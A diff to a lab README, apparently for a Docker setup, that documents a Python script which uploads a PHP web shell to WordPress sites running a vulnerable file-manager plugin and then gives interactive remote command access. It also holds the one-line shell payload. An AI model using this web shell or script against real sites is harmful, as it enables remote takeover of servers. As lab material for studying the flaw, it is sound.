@@ -23,5 +23,36 @@ Make sure Docker is installed, then run:
 docker-compose up -d
 ```
 
-```browser
-http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php
+---
+
+# WordPress File Manager Unsafe Exploit
+
+A simple Python script that uploads a PHP web shell to vulnerable WordPress installations using the `wp-file-manager-unsafe` plugin.
+
+## Usage
+```bash
+python3 exploit.py --url http://target.com --file shell.php
+```
+
+## How It Works
+1. Uploads a PHP shell to the plugin's upload directory.
+2. Prints the final shell URL.
+3. Starts an interactive command mode so you can run commands remotely.
+
+## Requirements
+- Python 3
+- requests library
+
+Install dependency:
+```bash
+pip install requests
+```
+
+## Example
+```bash
+python3 exploit.py --url http://localhost:9999 --file payload.php
+```
+
+## Disclaimer
+For lab and educational use only.
+Only works with "<?php echo shell_exec($_GET['cmd']); ?>" payload 
